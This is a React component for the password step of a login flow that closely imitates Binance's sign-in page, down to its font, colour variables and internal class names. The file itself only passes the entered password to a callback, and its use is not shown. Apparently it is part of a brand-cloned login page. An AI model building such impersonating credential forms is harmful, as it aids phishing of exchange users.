
import { FC, useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader } from "lucide-react";

interface PasswordStepProps {
  password: string;
  isLoading: boolean;
  onSubmit: (password: string) => void;
  onBack: () => void;
}

export const PasswordStep: FC<PasswordStepProps> = ({ password: initialPassword, isLoading, onSubmit, onBack }) => {
  const [password, setPassword] = useState(initialPassword);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password.trim()) {
      onSubmit(password);
    }
  };

  return (
    <>
      {/* Header */}
      <div className="mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Enter Password
        </div>
      </div>

      {/* Password Form */}
      <form onSubmit={handleSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="bn-formItem-label block mb-2" 
            htmlFor="password-input"
            style={{ 
              color: "var(--color-PrimaryText, #EAECEF)",
              fontFamily: "BinanceNova, Arial, sans-serif",
              fontSize: "14px",
              fontWeight: "400",
              lineHeight: "20px"
            }}
          >
            Password
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: "1px solid var(--color-InputLine, #474D57)"
                }}
                role="group"
              >
                <input
                  placeholder="Enter your password"
                  type="password"
                  role="textbox"
                  aria-label="Password field"
                  name="password"
                  autoFocus
                  id="password-input"
                  autoCapitalize="off"
                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                  style={{ 
                    color: "var(--color-PrimaryText, #EAECEF)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "400",
                    lineHeight: "20px"
                  }}
                  spellCheck="false"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
            </div>
          </div>
        </div>

        <Button
          className="w-full py-3 rounded transition-colors mb-4"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading || !password.trim()}
        >
          {isLoading ? (
            <Loader className="animate-spin h-4 w-4" />
          ) : (
            "Continue"
          )}
        </Button>

        <button
          type="button"
          onClick={onBack}
          className="w-full text-center text-sm"
          style={{
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif"
          }}
        >
          Back to email
        </button>
      </form>
    </>
  );
};
